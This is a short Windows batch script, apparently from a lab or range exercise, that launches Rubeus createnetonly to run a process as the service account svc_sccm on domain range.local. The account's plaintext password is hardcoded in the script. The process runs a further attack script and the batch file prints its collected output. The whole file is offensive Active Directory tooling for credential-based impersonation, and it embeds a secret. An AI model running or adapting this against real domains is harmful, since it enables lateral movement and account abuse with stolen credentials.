@echo off
chcp 437 >nul
cd /d C:\Tools\ADTools
del /q C:\Tools\cadre-attack\sccm-out.txt 2>nul
echo === CREATENETONLY launch ===
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /args:"/c C:\Tools\cadre-attack\branchc-run.cmd" /username:svc_sccm /domain:range.local /password:s3rv1c3_SCCM!
echo === Waiting for output ===
for /l %%i in (1,1,30) do @(
  if exist C:\Tools\cadre-attack\sccm-out.txt goto :done
  timeout /t 1 /nobreak >nul
)
:done
echo === OUTPUT ===
type C:\Tools\cadre-attack\sccm-out.txt 2>nul
